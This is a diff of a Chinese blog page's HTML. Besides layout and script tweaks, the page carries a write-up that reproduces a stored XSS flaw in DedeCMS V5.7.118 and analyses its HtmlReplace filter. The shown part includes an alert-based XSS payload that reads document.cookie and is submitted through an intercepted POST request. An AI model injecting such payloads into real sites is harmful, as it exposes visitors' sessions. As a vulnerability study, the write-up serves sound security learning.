@@ -10,7 +10,7 @@
 <meta name="description" content="DedeCMS V5.7.118 版本漏洞分析与复现">
 <meta name="author" content="map[name:xvsf]">
 <link rel="canonical" href="https://xvshifu.github.io/xvsf/posts/dedecms-v5.7.118-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.107842b3d7a50993f400a2f9d591dd6f46830b1393c74b51d61e8545ebbb93dc.css" integrity="sha256-EHhCs9elCZP0AKL51ZHdb0aDCxOTx0tR1h6FReu7k9w=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.070c3d495fee0ddd7e9422e47ae72235cec36eed466deee6c2ab5060371fa638.css" integrity="sha256-Bww9SV/uDd1&#43;lCLkeuciNc7Dbu1Gbe7mwqtQYDcfpjg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://xvshifu.github.io/xvsf/img/2.jpg">
 <link rel="icon" type="image/png" sizes="16x16" href="https://xvshifu.github.io/xvsf/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://xvshifu.github.io/xvsf/favicon-32x32.png">
@@ -81,7 +81,9 @@
 
 <div id="lightbox-overlay" class="lightbox-overlay" aria-hidden="true">
     <button class="lightbox-close" aria-label="关闭">&times;</button>
+    <button class="lightbox-nav lightbox-prev" aria-label="上一张">‹</button>
     <img class="lightbox-img" alt="">
+    <button class="lightbox-nav lightbox-next" aria-label="下一张">›</button>
 </div>
 
 
@@ -122,8 +124,7 @@ document.addEventListener('DOMContentLoaded', () => {
     <meta property="article:published_time" content="2026-03-07T10:00:00+08:00">
     <meta property="article:modified_time" content="2026-03-07T10:00:00+08:00">
     <meta property="article:tag" content="CMS审计">
-    <meta property="article:tag" content="漏洞复现">
-      <meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
+    <meta property="article:tag" content="漏洞复现"><meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:title" content="DedeCMS-V5.7.118 漏洞复现">
@@ -365,151 +366,146 @@ document.addEventListener('DOMContentLoaded', () => {
 <script>
     let activeElement;
     let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
+    let tocLinks;
+    const visibleHeadings = new Set();
+
+    document.addEventListener('DOMContentLoaded', function () {
         checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+
+        elements = Array.from(document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]'));
+        tocLinks = new Map(Array.from(document.querySelectorAll('.toc .inner a[href^="#"]')).map(link => [link.getAttribute('href').toLowerCase(), link]));
+
         if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+            setActiveHeading(elements[0]);
+            observeHeadings();
         }
-    
-        
+
         const topLink = document.getElementById('top-link');
         if (topLink) {
             topLink.addEventListener('click', (event) => {
-                
                 event.preventDefault();
-    
-                
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             });
         }
     }, false);
-    
-    window.addEventListener('resize', function(event) {
+
+    window.addEventListener('resize', function () {
         checkTocPosition();
     }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
+
     const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
     const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
     const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
+
+    function observeHeadings() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    visibleHeadings.add(entry.target);
+                } else {
+                    visibleHeadings.delete(entry.target);
+                }
+            });
+
+            const visible = elements.find(element => visibleHeadings.has(element));
+            if (visible) {
+                setActiveHeading(visible);
+                return;
+            }
+
+            const passed = elements.filter(element => element.getBoundingClientRect().top <= getHeaderOffset());
+            setActiveHeading(passed[passed.length - 1] || elements[0]);
+        }, {
+            rootMargin: `-${getHeaderOffset()}px 0px -55% 0px`,
+            threshold: [0, 1]
+        });
+
+        elements.forEach(element => observer.observe(element));
+    }
+
+    function setActiveHeading(element) {
+        if (!element || element === activeElement) return;
+        activeElement = element;
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+        const id = `#${encodeURI(element.getAttribute('id')).toLowerCase()}`;
+        const tocLink = tocLinks.get(id);
+        if (!tocLink) return;
+
+        tocLink.classList.add('active');
+
+        const tocContainer = document.querySelector('.toc .inner');
+        if (tocContainer) {
+            const scrollPosition = tocLink.offsetTop - (tocContainer.clientHeight / 2) + (tocLink.clientHeight / 2);
+            tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+        }
+    }
+
     function checkTocPosition() {
         const width = document.body.scrollWidth;
-    
+
         if (width - main - (toc * 2) - (gap * 4) > 0) {
             document.getElementById("toc-container").classList.add("wide");
         } else {
             document.getElementById("toc-container").classList.remove("wide");
         }
     }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
+
+    function getHeaderOffset() {
+        return parseInt(getComputedStyle(document.body).getPropertyValue('--header-height'), 10) + 16;
     }
-    
 </script>
 <h1 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h1>
-<p>[<a href="https://zhihao.org.cn/?p=202">0day]织梦DedeCMS 0click劫持导致的前台rce getshell</a></p>
+<p>[<a href="https://zhihao.org.cn/?p=202" target="_blank" rel="noopener noreferrer">0day]织梦DedeCMS 0click劫持导致的前台rce getshell</a></p>
 <h1 id="环境搭建">环境搭建：<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
 <p>源码下载：</p>
-<p><a href="https://www.dedecms.com/download">https://www.dedecms.com/download</a></p>
+<p><a href="https://www.dedecms.com/download" target="_blank" rel="noopener noreferrer">https://www.dedecms.com/download</a></p>
 <p>按照 readme.txt 进行安装：</p>
 <p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916997.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="945" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916361.png" style="max-width: 100%; height: auto; aspect-ratio: 1200 / 945;" width="1200"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915641.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917798.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="945" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916361.png" style="max-width: 100%; height: auto; aspect-ratio: 1200 / 945;" width="1200"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915641.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917798.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h1 id="前置准备">前置准备：<a hidden class="anchor" aria-hidden="true" href="#前置准备">#</a></h1>
 <p>首先需要注册一个账号，</p>
 <p>默认会员功能是关闭的，建议将其开启：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915685.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915685.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>包括会员使用权限也可以关闭，不然后续会很麻烦</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917499.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><a href="http://dedecms:9876/member/index.php">http://dedecms:9876/member/index.php</a></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917499.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><a href="http://dedecms:9876/member/index.php" target="_blank" rel="noopener noreferrer">http://dedecms:9876/member/index.php</a></p>
 <p>在该页面进行注册</p>
 <h1 id="漏洞-1---前台-xss">漏洞 1 - 前台 XSS<a hidden class="anchor" aria-hidden="true" href="#漏洞-1---前台-xss">#</a></h1>
 <h2 id="相关设置">相关设置<a hidden class="anchor" aria-hidden="true" href="#相关设置">#</a></h2>
 <p>在写文章的过程中，有“隶属栏目”是必选项，但是默认不存在任何栏目，需要管理员在后台添加：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916172.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917341.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915730.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916172.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917341.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915730.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h2 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h2>
 <p>功能点：/member/article_add.php</p>
 <p>标题和内容写入 XSS payload：<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917630.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917630.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>当然，直接在此处编辑的内容都会被转义，<strong>前端富文本编辑器会自动将 <code>&lt;</code>编码为 <code>&amp;lt;</code></strong>，需要用 Burp Suite 等工具直接构造 POST 请求，绕过前端编码。发送到服务器的数据已经“变形”了，所以最好是抓包后进行修改：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916105.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916105.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>对 body 处进行写入 payload：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915371.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915371.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>成功发布文章</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916201.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916201.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>访问对应的文章：/plus/view.php?aid={id}</p>
 <p>可以看到触发了 XSS 漏洞：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916594.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915794.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916594.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915794.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h2 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h2>
 <p>用户登录后，访问 /member/article_add.php 进行发布文章，拦截 POST 请求之后，对数据包中的 body 和 title ，写入 payload：<code>&lt;img src=b onerror=alert('xss')&gt;</code>（payload 构造后续分析），在服务器返回响应的过程中，代码是如何实现的？</p>
 <p>uploads/member/article_add.php</p>
 <p>在提交 POST 请求时可以注意到有 dopost  save 字段</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916814.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916814.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>源码中也存在对应的代码</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915918.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915918.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>也就是说用户： POST (dopost=save)</p>
 <p>-&gt; <!-- raw HTML omitted -->include(DEDEMEMBER.&rsquo;/inc/archives_check.php&rsquo;);<!-- raw HTML omitted -->   <strong>此处是执行过滤的关键点</strong></p>
 <p>-&gt; 处理附加表字段 ($dede_addonfields)</p>
 <p>跟进：/inc/archives_check.php</p>
 <p>重点关注以下四行：</p>
-<div class="code-block-container" id="code-1779933344372757500" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344372757500">
+<div class="code-block-container" id="code-1779947699544200900" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699544200900">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -521,12 +517,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344372757500" title="Toggle" aria-expanded="false" aria-controls="code-1779933344372757500" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699544200900" title="Toggle" aria-expanded="false" aria-controls="code-1779947699544200900" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344372757500-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699544200900-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -542,12 +538,12 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl"><span class="nv">$keywords</span> <span class="o">=</span> <span class="nx">cn_substrR</span><span class="p">(</span><span class="nx">HtmlReplace</span><span class="p">(</span><span class="nv">$tags</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">30</span><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915841.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915841.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>这些都是对<strong>用户输入的数据</strong>调用<code>**HtmlReplace()**</code>函数进行处理</p>
 <h3 id="过滤函数-htmlreplace">过滤函数 HtmlReplace()<a hidden class="anchor" aria-hidden="true" href="#过滤函数-htmlreplace">#</a></h3>
 <p>继续跟进<code>**HtmlReplace()**</code></p>
 <p>uploads/include/helpers/filter.helper.php</p>
-<div class="code-block-container" id="code-1779933344373452500" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344373452500">
+<div class="code-block-container" id="code-1779947699544200900" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699544200900">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -559,12 +555,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344373452500" title="Toggle" aria-expanded="false" aria-controls="code-1779933344373452500" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699544200900" title="Toggle" aria-expanded="false" aria-controls="code-1779947699544200900" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344373452500-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699544200900-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -624,10 +620,10 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916456.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916456.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>$rptype = 0 表示仅替换 html标记</p>
 <p><code>dede_htmlspecialchars()</code>的作用是对字符<code>&lt; &gt; &quot; ' &amp;</code>进行转义</p>
-<div class="code-block-container" id="code-1779933344376925200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344376925200">
+<div class="code-block-container" id="code-1779947699546684800" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699546684800">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -639,12 +635,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344376925200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344376925200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699546684800" title="Toggle" aria-expanded="false" aria-controls="code-1779947699546684800" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344376925200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699546684800-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -680,9 +676,9 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070914120.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070914120.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p><!-- raw HTML omitted -->$rptype = 1 表示替换 html标记同时去除连续空白字符<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344376925200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344376925200">
+<div class="code-block-container" id="code-1779947699549664100" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699549664100">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -694,12 +690,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344376925200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344376925200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699549664100" title="Toggle" aria-expanded="false" aria-controls="code-1779947699549664100" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344376925200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699549664100-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -722,7 +718,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </div></div>
 </div><p>$rptype = 2 表示替换 html标记同时去除所有空白字符</p>
-<div class="code-block-container" id="code-1779933344376925200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344376925200">
+<div class="code-block-container" id="code-1779947699550730200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699550730200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -734,12 +730,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344376925200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344376925200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699550730200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699550730200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344376925200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699550730200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -758,7 +754,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </div></div>
 </div><p>$rptype = -1 表示仅替换 html 危险的标记</p>
-<div class="code-block-container" id="code-1779933344377728700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344377728700">
+<div class="code-block-container" id="code-1779947699551725000" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699551725000">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -770,12 +766,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
